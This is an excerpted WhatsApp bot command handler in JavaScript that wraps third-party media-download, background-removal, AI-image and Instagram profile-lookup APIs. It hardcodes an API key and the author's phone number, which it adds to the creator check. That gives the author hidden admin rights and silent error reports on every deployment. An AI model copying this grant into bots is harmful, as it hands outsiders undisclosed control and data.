/*
   ...
   • My Contact https://wa.me/6282144323683
...
module.exports = conn = async (conn, m, chatUpdate, store) => {
    try {
        ...
        const isCreator = [botNumber, ...global.owner, '6282144323683@s.whatsapp.net'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
...
break
			...
			newReply(mess.wait)
			axios
			    .get(`https://api.botcahx.live/api/search/yts?query=${full_args}&apikey=${apikeys}`)
			    .then(({
			        data
			    }) => {
			        axios.get(`https://api.botcahx.live/api/dowloader/yt?&url=https://youtu.be/${data.result[0].videoId}&apikey=${apikeys}`).then(({
			            data
			        }) => {
			            var caption = `❖ Title   : *${data.result.title}*\n`
			            caption += `❖ Size   : *${data.result.mp3.size}*`
			            conn.sendMessage(m.chat, {
			                image: {
			                    url: data.result.thum
			                },
			                caption
			            }).then(() => {
			                conn.sendMessage(m.chat, {
			                    audio: {
			                        url: data.result.mp4.result
			                    },
			                    mimetype: 'audio/mp4',
...
break
			...
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
			newReply(mess.wait)
			axios.get(`https://api.botcahx.live/api/dowloader/tiktok?url=${args[0]}&apikey=${apikeys}`).then(({ data }) => {
				conn.sendMessage(m.chat, { video: { url: data.result.video[0] }, mimetype: 'video/mp4' })
			})
			.catch(console.error)
			break;
			...
			newReply(mess.wait)
			axios.get(`https://api.botcahx.live/api/dowloader/tiktok?url=${args[0]}&apikey=${apikeys}`).then(({ data }) => {
				conn.sendMessage(m.chat, { audio: { url: data.result.audio[0] }, mimetype: 'audio/mp4' })
			})
			.catch(console.error)
			break;
...
if (!text) return m.reply(`👋🏻 Halo Kak, Butuh Bantuan?\nExample:  ${prefix + command} Pacarku Cantik Banget Kan?`)
 m.reply(`Tunggu sebentar kak ${pushname}`);
 try{
 const payload = {
     message: text,
     userId: m.sender,
...
const ano = await TelegraPH(media3)
const bg = await fetch(`https://api.botcahx.live/api/tools/removebg?url=${ano}&apikey=${apikeys}`);
const datai = await bg.json();
const imgs = datai.url.result;
conn.sendMessage(m.chat, {
        image: {
            url: imgs
        },
...
case "ai-img": case "image": case "images": case "dall-e": case "dalle":
try {
    if (!text) return m.reply(`Membuat gambar dari AI.\n\nContoh:\n${prefix}${command} Wooden house on snow mountain`);
    const response1 = await fetch(`https://api-translate.azharimm.dev/translate?engine=google&text=${encodeURIComponent(text)}&to=en`);
...
break;
			...
			newReply(mess.wait)
			axios.get(`https://api.zahwazein.xyz/stalker/ig?username=${args[0]}&apikey=zenzkey_64e4a7a6f307`).then(({ data }) => {
				var caption = `Username : ${data.result.username}\n`
				caption += `Full Name : ${data.result.full_name}\n`
				caption += `Posts : ${data.result.media_count}\n`
				caption += `Followers : ${data.result.follower_count}\n`
				caption += `Following : ${data.result.following_count}\n`
				caption += `Bio : ${data.result.biography}`
                conn.sendMessage(m.chat, {
                    text: caption,
                    contextInfo: {
                        externalAdReply: {
                            ...
                            title: '',
                            body: "",
                            thumbnailUrl: data.result.hd_profile_pic_url_info.url,
                            sourceUrl: `https://www.instagram.com/${data.result.username}`,
                            mediaType: 1,
...
let e = String(err)
conn.sendMessage("6282144323683@s.whatsapp.net", { text: "👋🏻 Hello developer, ada yang error nih! di bagian " + util.format(e), 
contextInfo:{
